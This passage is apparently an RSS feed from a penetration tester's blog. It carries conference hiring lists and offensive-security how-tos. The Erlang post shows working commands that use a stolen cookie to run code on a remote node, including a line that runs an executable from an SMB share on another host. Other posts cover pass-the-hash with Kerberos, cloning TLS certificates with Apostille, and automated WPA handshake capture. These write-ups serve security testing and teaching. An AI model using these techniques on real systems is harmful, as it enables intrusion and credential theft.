<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on </title>
    <link>https://malicious.link/post/</link>
    <description>Recent content in Posts on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 15 Dec 2018 09:30:44 -0500</lastBuildDate>
    
        <atom:link href="https://malicious.link/post/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>2019 ShmooCon Hiring List</title>
      <link>https://malicious.link/post/2018/2019-shmoocon-hiring-list/</link>
      <pubDate>Sat, 15 Dec 2018 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/2019-shmoocon-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2018 UNOFFICIAL &lt;a href=&#34;https://shmoocon.org/&#34;&gt;ShmooCon&lt;/a&gt; Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/I4sbeEpxMwNI6qn33&#34;&gt;https://goo.gl/forms/I4sbeEpxMwNI6qn33&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to the Hiring List Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/1HnDVbXqQU74X8RyLdTPZ36ZPlbpXYk5ByO1uw55eWI0/&#34;&gt;https://docs.google.com/spreadsheets/d/1HnDVbXqQU74X8RyLdTPZ36ZPlbpXYk5ByO1uw55eWI0/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;3900&#34; width=&#34;1000&#34; src=&#34;https://docs.google.com/spreadsheets/d/e/2PACX-1vRQdjd_XkEwUH9ZavinpWRptb8VOlwtbFwrmDjEWs5qi4rBhbJbXXpGdx-oIC2sTgN9nw10pz_4hC-b/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Wifi Feature Request: WPA handshakes</title>
      <link>https://malicious.link/post/2018/wifi-feature-request-wpa-handshakes/</link>
      <pubDate>Sun, 14 Oct 2018 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/wifi-feature-request-wpa-handshakes/</guid>
      <description>&lt;p&gt;I have a bit of a feature request for all wireless assessment tools out there:&lt;/p&gt;

&lt;p&gt;Many times before arriving on site for an assessment, I&amp;rsquo;ll know the ESSIDs of a target wireless network for a client. Getting channels and BSSIDs isn&amp;rsquo;t usually an option. Also, many times during the assessment I&amp;rsquo;m performing there are physical aspects to it, like guards or cameras, so sitting down in the lobby and typing out commands to De-auth that client or BSSID isn&amp;rsquo;t really great OPSEC. SO this is my ask:&lt;/p&gt;

&lt;p&gt;Please make a mode or setting where I can specify a ESSID ahead of time (so I am only targeting the client networks I know of) that I can just leave running on a RaspberryPI or other small device + wireless card in my backpack. This mode would then search for WPA-PSK APs with that name, find ones with clients on it by hopping, deauth and try to capture the handshake, but would then go-back to hopping after a few minutes if failing (as I&amp;rsquo;m probably walking around the inside and outside of the building). A nice to have would that it would then exclude that network from the list provided and move on. Possibly also going after the ones with the most clients in the list automatically would be a plus as well.&lt;/p&gt;

&lt;p&gt;The end result would be that I would have a couple WPA handshakes that I could then crack off-line just by walking around the building doing other things.&lt;/p&gt;

&lt;p&gt;The key to this whole thing is not to get stuck on a single BSSID or client, and be able to reliably move on to another channel, BSSID or target ESSID without interaction. Let the WPA Handshake Hunting begin!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Erlang Authenticated Remote Code Execution</title>
      <link>https://malicious.link/post/2018/erlang-arce/</link>
      <pubDate>Sat, 15 Sep 2018 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/erlang-arce/</guid>
      <description>

&lt;p&gt;&lt;a href=&#34;http://erlang.org/faq/introduction.html&#34;&gt;Erlang is a programming language&lt;/a&gt; that I have tried to learn a few times in the past but never really dug in, that is, until recently.&lt;/p&gt;

&lt;p&gt;Erlang is an interesting language because it has &lt;a href=&#34;http://erlang.org/faq/introduction.html&#34;&gt;&amp;ldquo;built-in concurrency, distribution, and fault tolerance&amp;rdquo;&lt;/a&gt;. To me, this means that it does job queuing and distributed tasks right out of the gate.&lt;/p&gt;

&lt;h3 id=&#34;a-little-bit-of-history&#34;&gt;A little bit of history&lt;/h3&gt;

&lt;p&gt;I first started digging into Erlang again from an attackers point of view at &lt;a href=&#34;https://www.bsidesphilly.org/&#34;&gt;BSides Philadelphia&lt;/a&gt; 2016, where I talked about SolarWinds ORION. I was in the audience making last minute changes to my slides when I happened upon an &amp;ldquo;erlang-node&amp;rdquo; port (25672) listening. You can watch the video here (I&amp;rsquo;ve jumped ahead to the part about the Erlang port):&lt;/p&gt;

&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/VXUPyod6vqw?start=240&#34; frameborder=&#34;0&#34; allow=&#34;autoplay; encrypted-media&#34; allowfullscreen&gt;&lt;/iframe&gt;

&lt;p&gt;After I gave that talk, I asked around &lt;a href=&#34;http://novahackers.blogspot.com/p/how-to-join-and-rules.html&#34;&gt;NoVA Hackers&lt;/a&gt;. Luckily one such individual did, and that&amp;rsquo;s why I love what NoVA Hackers has grown into, but this post isn&amp;rsquo;t about that.&lt;/p&gt;

&lt;p&gt;With a little bit of back and forth with what I was trying to accomplish, we worked out the needed requirements for code execution.&lt;/p&gt;

&lt;h3 id=&#34;erlnag-nodes&#34;&gt;Erlnag Nodes&lt;/h3&gt;

&lt;p&gt;Erlang uses &amp;ldquo;Nodes&amp;rdquo; to execution code. As far as I can tell (and I&amp;rsquo;ll probably be corrected) but you must run a node to execute any Erlang code, so everything written in Erlang (RabbitMQ, CouchDB, etc.) must be running a node. Erlang nodes are identified by their hostname. For my SolarWinds box, it&amp;rsquo;s &lt;code&gt;WIN-PM0ID6F0AHN&lt;/code&gt;. This is the most straightforward piece of information to acquire for the authenticated RCE.&lt;/p&gt;

&lt;h3 id=&#34;the-cookie&#34;&gt;The Cookie&lt;/h3&gt;

&lt;p&gt;The Erlang cookie &lt;strong&gt;SHOULD&lt;/strong&gt; be the hardest to acquire. It&amp;rsquo;s essentially the shared secret password between nodes, and just a simple string. This cookie exists even if only a single node is spun up (such is the case for SolarWinds). It is most commonly stored in a file called &lt;code&gt;.erlang.cookie&lt;/code&gt; with nothing in the file other than the string. You can find it in home directories, userprofiles, project files and such. On Linux, it begining with the &lt;code&gt;.&lt;/code&gt; means that it&amp;rsquo;s automatically a &amp;ldquo;hidden&amp;rdquo; file, but on Windows it doesn&amp;rsquo;t mean much ;). RabbitMQ documents well where the key is located:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.rabbitmq.com/clustering.html#erlang-cookie&#34;&gt;https://www.rabbitmq.com/clustering.html#erlang-cookie&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Example &lt;code&gt;.erlang.cookie&lt;/code&gt; file:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rabbit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;One Windows for Solar Winds it can be found in &lt;strong&gt;Program Data&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/erlang_sw_cookie.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;the-cluster-name&#34;&gt;The Cluster Name&lt;/h3&gt;

&lt;p&gt;The cluster name is needed to join the cluster but this is more of a guessing game. However, luckily these are regularly named based on the service being offered. RabbitMQ in particular almost always has a cluster name of &lt;code&gt;rabbit&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&#34;the-node-port&#34;&gt;The Node Port&lt;/h3&gt;

&lt;p&gt;This is actually pretty interesting that I haven&amp;rsquo;t dived into completely yet, but the port isn&amp;rsquo;t specified or default. There is some sort of discovery process so no matter the port the nodes are running on Erlang is able t find it. In the case of SolarWinds Orion&amp;rsquo;s RabbitMQ, its &lt;code&gt;25672&lt;/code&gt; but I&amp;rsquo;ve seen erlang nodes on a number of other ports, usually particular to the project it&amp;rsquo;s being run for.&lt;/p&gt;

&lt;h3 id=&#34;remote-code-execution&#34;&gt;Remote Code Execution&lt;/h3&gt;

&lt;p&gt;A simple &lt;code&gt;apt install erlang&lt;/code&gt; gets you ready for exectuion. Once installed you need to put your &lt;code&gt;.erlang.cookie&lt;/code&gt; file in your home directory &lt;code&gt;~/&lt;/code&gt;. You also need to resolve the hostname (Node name) you wil be connecting to.&lt;/p&gt;

&lt;p&gt;Then it&amp;rsquo;s just running a couple commands:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;test&lt;/code&gt; is the node name you&amp;rsquo;ll be calling your attack box when connecting to the cluster&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rabbit&lt;/code&gt; is the cluster name being connected to&lt;/li&gt;
&lt;li&gt;&lt;code&gt;WIN-PM0ID6F0AHN&lt;/code&gt; is the hostname I&amp;rsquo;m connecting to the cluster via&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Start up Erlang with &lt;code&gt;erl -sname test&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# erl -sname test
Erlang/OTP 18 [erts-7.3.1.2] [source] [64-bit] [async-threads:10] [kernel-poll:false]

Eshell V7.3.1.2  (abort with ^G)
(test@kali)1&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Connecting to the cluster (the period on the end of the commands important terminators)&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(test@kali)1&amp;gt; net_kernel:connect(&#39;rabbit@WIN-PM0ID6F0AHN&#39;).
true
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you get a &lt;code&gt;true&lt;/code&gt; that means the connection was successful.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Code exeuction (starting calc of course)&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(test@kali)2&amp;gt; erlang:spawn(&#39;rabbit@WIN-PM0ID6F0AHN&#39;,os,cmd,[&amp;quot;calc.exe&amp;quot;]).
&amp;lt;6867.30570.461&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And so, like any good code execution attack, &lt;code&gt;calc.exe&lt;/code&gt; is executed:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/erlang_sw_calc.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;On Windows of course you can even do SMB shares:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;erlang:spawn(&#39;rabbit@WIN-PM0ID6F0AHN&#39;,os,cmd,[&amp;quot;\\\\192.168.80.69\\share\\runme.exe&amp;quot;]).
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Exiting the &lt;strong&gt;Erlang Shell&lt;/strong&gt; is done with the init::stop function:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(test@kali)3&amp;gt; init:stop().
ok
(test@kali)4&amp;gt; root@kali:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;warning-by-running-this-code-execution-method-you-are-running-a-node-as-well-as-as-long-as-you-have-the-connection-open-you-can-be-exploited-the-same-way-you-are-exploiting-the-remote-host&#34;&gt;Warning: By running this code execution method you are running a node as well, as as long as you have the connection open, you can be exploited the same way you are exploiting the remote host.&lt;/h4&gt;

&lt;h3 id=&#34;the-bad-and-the-worse&#34;&gt;The Bad, and the worse&amp;hellip;&lt;/h3&gt;

&lt;p&gt;In many Docker instances the &lt;code&gt;.erlang.cookie&lt;/code&gt; file is statically assigned and easy to find in the code. This is incredibly dangerous to have a statically assigned Erlang cookie for anyone who uses your Docker image, however because Docker doesn&amp;rsquo;t automatically expose ports from the docker instance, this is actually a better scenario in many cases than running the erlang project without containers.&lt;/p&gt;

&lt;p&gt;This is not always the case and just like &lt;a href=&#34;https://www.itnews.com.au/news/passwords-ssh-keys-exposed-on-github-330152&#34;&gt;private keys on github&lt;/a&gt;, really easy to find:&lt;/p&gt;

&lt;p&gt;Searching for &lt;code&gt;.erlang.cookie&lt;/code&gt; on Github:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/erlang_github.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;the-ugly&#34;&gt;The Ugly&lt;/h3&gt;

&lt;p&gt;Changing the Erlang Cookie is a pain, and usually very deep in the project or setup, so once you have the file, you have future proof code execution.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2018 KiwiCon Hiring List</title>
      <link>https://malicious.link/post/2018/2018-kiwicon-hiring-list/</link>
      <pubDate>Sun, 09 Sep 2018 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/2018-kiwicon-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2018 UNOFFICIAL &lt;a href=&#34;https://kiwicon.org/&#34;&gt;Kiwicon&lt;/a&gt; Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/hfftscOGBWp14Ust1&#34;&gt;https://goo.gl/forms/hfftscOGBWp14Ust1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to the Hiring List Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/1q_qBbtBkbNNEmOoLkayW4GoMRXbMGIC3JyK0g9ML9fw/&#34;&gt;https://docs.google.com/spreadsheets/d/1q_qBbtBkbNNEmOoLkayW4GoMRXbMGIC3JyK0g9ML9fw/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;3900&#34; width=&#34;1000&#34; src=&#34;https://docs.google.com/spreadsheets/d/e/2PACX-1vSrLjmBB_5vuyY8yLBw6YG2j4Bw5QYnFI43MdM4TI6XeFNsRsUYGktdxsb1p-Spk_HrNKva-m7ThA8f/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>2018 DerbyCon Hiring List</title>
      <link>https://malicious.link/post/2018/2018-derbycon-hiring-list/</link>
      <pubDate>Sat, 01 Sep 2018 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/2018-derbycon-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2018 UNOFFICIAL &lt;a href=&#34;https://www.derbycon.com/&#34;&gt;DerbyCon&lt;/a&gt; Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/K6kfOY5dHH6lcQm63&#34;&gt;https://goo.gl/forms/K6kfOY5dHH6lcQm63&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to the Hiring List Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/11J2oqGndmBB7mFoc_JfpMGv6S41UZRcTi7NByjavHBU/&#34;&gt;https://docs.google.com/spreadsheets/d/11J2oqGndmBB7mFoc_JfpMGv6S41UZRcTi7NByjavHBU/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;3900&#34; width=&#34;1000&#34; src=&#34;https://docs.google.com/spreadsheets/d/e/2PACX-1vS3_6HGQEgYQTByN3GA2BZOhCFTwjMywdlNdu6IUXIDKdgmAVMT5sf5sep929lUtD0qgo6XupfkrF0B/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Stealing Certificates with Apostille</title>
      <link>https://malicious.link/post/2018/stealing-certificates-with-apostille/</link>
      <pubDate>Sun, 26 Aug 2018 08:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/stealing-certificates-with-apostille/</guid>
      <description>&lt;p&gt;At Def Con 26, &lt;a href=&#34;https://twitter.com/singe&#34;&gt;@singe&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/_cablethief&#34;&gt;@_cablethief&lt;/a&gt; gave a talk on enterprise wireless attacks. When it&amp;rsquo;s video is released you should check it out.&lt;/p&gt;

&lt;p&gt;During that talk, they quickly touched on a tool written by &lt;a href=&#34;https://twitter.com/rogandawes&#34;&gt;Rogan Dawes&lt;/a&gt; another &lt;a href=&#34;https://twitter.com/sensepost&#34;&gt;@Sensepost&lt;/a&gt;-er&amp;rsquo;s tool called &amp;ldquo;&lt;a href=&#34;https://github.com/sensepost/apostille&#34;&gt;Apostille&lt;/a&gt;&amp;rdquo;. It is esentially a certificate stealing (cloning? faking? doppelganger-ing?) tool. However, that over simplifies what it does.&lt;/p&gt;

&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;To be more accurate, Apostille generates a clone of the certificate chain, identical in as many details as possible, apart from the actual key values. One thing this could be useful for is bypassing naive cert pinning if the validation is based on details of the signing certs.&lt;/p&gt;&amp;mdash; Rogan Dawes (@RoganDawes) &lt;a href=&#34;https://twitter.com/RoganDawes/status/1033769690609463297?ref_src=twsrc%5Etfw&#34;&gt;August 26, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;


&lt;p&gt;Copying a certificate&amp;rsquo;s common name, email, or other fields that are inputted during creation is a relatively easy way to copy certificates, and they can look relatively good at first glance. However, this simple copy leads to many tell-tail signs that it&amp;rsquo;s fake. For instance lets say I create a certificate like so:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@apostille-post:~# openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout mycert.pem -out mycert.pem
Generating a 2048 bit RSA private key
.................................................................................................................+++
...+++
writing new private key to &#39;mycert.pem&#39;
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter &#39;.&#39;, the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:Mountain View
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Google LLC
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:*.google.com
Email Address []:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If I host it out, here are the results side by side with Google.com:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/stealing-certs-01.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;Vaild From&lt;/code&gt;, the &lt;code&gt;Issued By&lt;/code&gt;, and most of the other certificate information helps this certificate to stand out as fraudulent. Also, doing this by hand is a PITA.&lt;/p&gt;

&lt;p&gt;Enter &lt;strong&gt;Apostille&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s pretty straight forward to get it going, but you do need both Java&amp;rsquo;s JDK and Maven to compile it first:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@apostille-post:~# apt install -y maven default-jdk git
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(I&amp;rsquo;m doing this on a fresh box so it needed git as well)&lt;/p&gt;

&lt;p&gt;Step 2, &lt;code&gt;git clone&lt;/code&gt; the repo, and compile with Maven:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@apostille-post:~# git clone https://github.com/sensepost/apostille
Cloning into &#39;apostille&#39;...
remote: Counting objects: 48, done.
remote: Total 48 (delta 0), reused 0 (delta 0), pack-reused 48
Unpacking objects: 100% (48/48), done.
root@apostille-post:~# cd apostille/
root@apostille-post:~/apostille# mvn package
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Step 3, Clone your first certificate:
&lt;code&gt;java -jar target/apostille-1.0-SNAPSHOT.jar google.com:443 tempkeystore.jks ASDqwe123 ASDqwe123&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;google.com:443&lt;/code&gt; is the endpoint that will serve a certificate chain back, this isn&amp;rsquo;t regulated to only HTTPS, but any TLS endpoint.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;tempkeystore.jks&lt;/code&gt; is the Java Keystore file that we will putting the certificate chain into.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ASDqwe123&lt;/code&gt; is the &lt;code&gt;kspassword&lt;/code&gt; and then the &lt;code&gt;keypassword&lt;/code&gt; (Keystore and certificate password) - I just made them the same as this is an example and I won&amp;rsquo;t be using the keystore for anything but to export the certificates later.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In order to get the certificates out of the keystore and into a PEM format that I can use for testing, I used the following:&lt;/p&gt;

&lt;p&gt;Source: &lt;a href=&#34;https://www.calazan.com/how-to-convert-a-java-keystore-jks-to-pem-format/&#34;&gt;https://www.calazan.com/how-to-convert-a-java-keystore-jks-to-pem-format/&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@apostille-post:~/apostille# keytool -importkeystore -srckeystore tempkeystore.jks -destkeystore myapp.p12 -srcalias *.google.com -srcstoretype jks -deststoretype pkcs12
Importing keystore tempkeystore.jks to myapp.p12...Enter destination keystore password: ASDqwe123
Re-enter new password: ASDqwe123
Enter source keystore password: ASDqwe123
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(The passwords will not show up, but I put them in there so you can see what I&amp;rsquo;m inputting. Again I chose a simple password because I&amp;rsquo;m converting it one more time)&lt;/p&gt;

&lt;p&gt;Then finally to a PEM like so:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@apostille-post:~/apostille# openssl pkcs12 -in myapp.p12 -out myapp.pem
Enter Import Password: ASDqwe123
Enter PEM pass phrase: WugWZ3!F3hD#8P!f
Verifying - Enter PEM pass phrase: WugWZ3!F3hD#8P!f
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To test out how it looks I&amp;rsquo;ll reference &lt;a href=&#34;http://attackerkb.com/Web/Quick%20Web%20Servers&#34;&gt;AKB&amp;rsquo;s Quick Web Servers list&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@apostille-post:~/apostille# openssl s_server -cert myapp.pem -accept 443 -WWW
Enter pass phrase for myapp.pem: WugWZ3!F3hD#8P!f
Using default temp DH parameters
ACCEPT
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And the result is:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/stealing-certs-02.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/stealing-certs-03.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/stealing-certs-04.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;A much more believable certificate, even to the discerning eye.&lt;/p&gt;

&lt;p&gt;Again, thanks to &lt;a href=&#34;https://twitter.com/rogandawes&#34;&gt;@RoganDawes&lt;/a&gt; for this amazing tool.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2018 BH/DC/BSidesLV Hiring List</title>
      <link>https://malicious.link/post/2018/2018-bhdcbslv-hiring-list/</link>
      <pubDate>Fri, 27 Jul 2018 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/2018-bhdcbslv-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2018 UNOFFICIAL &lt;a href=&#34;https://www.blackhat.com/us-18/&#34;&gt;BlackHat&lt;/a&gt;, &lt;a href=&#34;https://defcon.org/&#34;&gt;DEF CON&lt;/a&gt;, &lt;a href=&#34;https://www.bsideslv.org/&#34;&gt;BSidesLV&lt;/a&gt; Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/dIjQHTPLk7ZYyv5D2&#34;&gt;https://goo.gl/forms/dIjQHTPLk7ZYyv5D2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to the Hiring List Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/13szhdt08HqmvV1pxZbrBzoYv8pe0vpvT-z9w-XTcEKw/&#34;&gt;https://docs.google.com/spreadsheets/d/13szhdt08HqmvV1pxZbrBzoYv8pe0vpvT-z9w-XTcEKw/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;3900&#34; width=&#34;1000&#34; src=&#34;https://docs.google.com/spreadsheets/d/e/2PACX-1vT-mq7vxGxVXOyO9IoBArmAAY7qA0851mq1S4wPG_98ZMWPVQHP9d8jTuFyJU_Lj4yU3Rq6YIg6ntaR/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Pass the Hash with Kerberos</title>
      <link>https://malicious.link/post/2018/pass-the-hash-with-kerberos/</link>
      <pubDate>Tue, 24 Jul 2018 08:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/pass-the-hash-with-kerberos/</guid>
      <description>&lt;p&gt;This blog post may be of limited use, most of the time, when you have an NTLM hash, you also have the tools to use it. But, if you find yourself in a situation where you don&amp;rsquo;t have the tools and do happen to have kerberos tools, you can pass the hash with it.&lt;/p&gt;

&lt;p&gt;Lets say with have the NTLM hash for the user &lt;code&gt;uberuser&lt;/code&gt; and the hash is &lt;code&gt;88e4d9fabaecf3dec18dd80905521b29&lt;/code&gt;. The first step to do so is to create a keytab file using &lt;code&gt;ktutil&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~# ktutil
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;At the &lt;code&gt;ktutil&lt;/code&gt; prompt, type in the &amp;ldquo;add entry&amp;rdquo; (&lt;code&gt;addent&lt;/code&gt;) command with the &amp;ldquo;principals&amp;rdquo; (&lt;code&gt;-p&lt;/code&gt;) flag. Specify the user and an all uppercase version of the FQDN. Then the &amp;ldquo;KVNO&amp;rdquo; (&lt;code&gt;-k 1&lt;/code&gt;), which is the key number. Finally the encryption type, which is &lt;code&gt;rc4-hmac&lt;/code&gt; for NTLM hashes:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ktutil: addent -p uberuser@CORP.SOMEWHATREALNEWS.COM -k 1 -key -e rc4-hmac
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After you hit enter you&amp;rsquo;ll get prompted for the rc4-hmac (NTLM) hash:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Key for uberuser@CORP.SOMEWHATREALNEWS.COM (hex): 88e4d9fabaecf3dec18dd80905521b29
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then we write the keytab file to disk and exit &lt;code&gt;ktutil&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ktutil: wkt /tmp/a.keytab
ktutil: exit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The last step before we can use our authentication is to create a kerberos ticket using our keytab file.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~# kinit -V -k -t /tmp/a.keytab -f uberuser@CORP.SOMEWHATREALNEWS.COM
Using default cache: /tmp/krb5cc_0
Using principal: uberuser@CORP.SOMEWHATREALNEWS.COM
Using keytab: /tmp/a.keytab
Authenticated to Kerberos v5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Validate it with &lt;code&gt;klist&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~# klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: uberuser@CORP.SOMEWHATREALNEWS.COM

Valid starting       Expires              Service principal
07/22/2018 21:38:43  07/23/2018 07:38:43  krbtgt/CORP.SOMEWHATREALNEWS.COM@CORP.SOMEWHATREALNEWS.COM
	renew until 07/23/2018 21:38:40

&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Getting Hired: A Few Tips</title>
      <link>https://malicious.link/post/2018/getting-hired-a-few-tips/</link>
      <pubDate>Sun, 22 Jul 2018 11:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/getting-hired-a-few-tips/</guid>
      <description>&lt;p&gt;In early August of 2017 &lt;a href=&#34;https://twitter.com/mubix/status/892760622563241988&#34;&gt;I posted a few tips to Twitter regarding interviewing and getting hired in general&lt;/a&gt;. I&amp;rsquo; pasting them here to preserve them. I only had 140 characters to make these, and I think there is a lot more you can do, but 30 tips is a good start.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Don&amp;rsquo;t post obvious CFAA violations to social media&lt;/li&gt;
&lt;li&gt;If you go in without a job and a chip on your shoulder, you&amp;rsquo;ll leave the same way&lt;/li&gt;
